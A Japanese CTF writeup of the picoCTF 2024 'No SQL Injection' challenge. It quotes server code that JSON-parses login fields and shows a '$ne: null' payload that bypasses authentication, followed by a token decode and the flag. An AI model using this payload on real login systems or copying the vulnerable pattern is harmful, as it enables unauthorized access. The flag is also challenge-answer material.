---
title: Pico CTF 2024「No SQL Injection」Medium Writeup
description: picoCTF 2024「No SQL Injection」のwriteup．Express + MongoDB のログイン処理で，JSONとしてパースされるパスワードに $ne 演算子を渡して認証をバイパスする
date: 2025-11-20 12:00:00 +0900
categories: [CyberSecurity, CTF]
tags: [web, pico_ctf]
---

- Challenge: No Sql Injection
- Tags: browser_webshell_solvable
- Genre: Web
- Difficulty: Medium
- Overview: Can you try to get access to this website to get the flag?

![nosqli_01](/assets/img/ctf/pico_ctf/pico_ctf_2024_medium_nosql_injection_01.png)

ソースコードは以下の形式になっています．

```
.
└── app
    ├── admin.html
    ├── index.html
    ├── package.json
    └── server.js
```

開発者ツールを用いて，ログインのhttp通信を見ます．<br>

```json
// Request
{"email":"test","password":"test"}

// Response
{"success":false}
```

次は，与えられているソースコードを読みます．<br>

**server.js**
```js
const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const { MongoMemoryServer } = require("mongodb-memory-server");
const path = require("path");
const crypto = require("crypto");
```

技術スタックとして，ExpressとMongoDBを利用していることがわかりました．<br>
これは，チャレンジ名の「NoSQL」と一致しています．また，`admin.html`には特に有用な情報はありませんでした．

`index.html`には，認証成功時に認証情報を`session storage`に保存し，`/admin`に遷移する処理が記載されています．

**index.html**
```js
// ...
 
<script>
        document.getElementById('loginForm').addEventListener('submit', function (event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                    if (data.success) {
                        // Save email and password to session storage (or handle it as needed)
                        sessionStorage.setItem('email', data.email);
                        sessionStorage.setItem('token', data.token);
                        sessionStorage.setItem('firstName', data.firstName);
                        sessionStorage.setItem('lastName', data.lastName);
                        window.location.href = '/admin';
                    } else {
                        alert('Invalid credentials');
                    }
                })
                .catch(error => console.error('Error:', error));
        });
</script>
```

`server.js` で侵入対象として使用できそうなユーザーの情報(email)を入手しました．

**server.html**
```js
// ...

    // Store initial user
    const initialUser = new User({
      firstName: "pico",
      lastName: "player",
      email: "picoplayer355@picoctf.org",
      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
    });
    await initialUser.save();

// ...
```

また，Mongooseを使用してMongoDBから，単一ユーザーを検索する際に，三項演算子で渡されたパラメータ値がJsonとして渡された場合にパースする処理が書かれています．
具体的には，emailとpasswordともに`{`で始まり`}`で終わる場合に，それをJsonとして解釈しパースする処理です．<br>

また，MongoDBでは検索条件に`$eq(等しい), $ne(等しくない), $regex(正規表現)`等のクエリオペレーターを含むオブジェクトを指定できます．
よって，この実装には検索条件そのものをユーザー入力として受け入れる重大な`NoSQL Injection`の脆弱性が存在します．<br>

**server.js**
```js
// ...

        const user = await User.findOne({
          email:
            email.startsWith("{") && email.endsWith("}")
              ? JSON.parse(email)
              : email,
          password:
            password.startsWith("{") && password.endsWith("}")
              ? JSON.parse(password)
              : password,
        });

// ...
```

先程入手したemailと，この脆弱性の悪用が可能なペイロードを用いて認証バイパスを試してみます．`Admin Page`に遷移したので，認証バイパスが成功しました．
これは，「メールアドレスが"picoplayer355@picoctf.org"であり，かつ，保存されているパスワードの値がnullではないユーザーを見つける」ための簡易な認証バイパスの為のペイロードです．

```json
// Request
{"email":"picoplayer355@picoctf.org","password":"{"$ne": null}"}
```

![nosqli_02](/assets/img/ctf/pico_ctf/pico_ctf_2024_medium_nosql_injection_02.png)

`session storage`から，`token`を抜き出すと`==`パディングが付与されており，base64文字列であることが推測されるので，decodeします．
結果として，フラッグを入手しました．

```zsh
$ echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==" | base64 -d
```

<details>
<summary>Flag</summary>
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}
</details>